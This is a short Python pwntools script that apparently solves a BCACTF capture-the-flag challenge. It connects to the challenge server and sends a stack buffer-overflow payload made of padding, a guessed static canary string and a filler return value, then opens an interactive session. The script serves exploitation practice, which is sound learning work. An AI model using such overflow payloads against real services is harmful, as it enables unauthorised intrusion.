from pwn import *

r = remote("challs.bcactf.com", 31615)

payload = b"A"*73 + b"canary\0" + p64(0x4141414141414141)

r.sendlineafter("Enter a string: ", payload)

r.interactive()
r.close()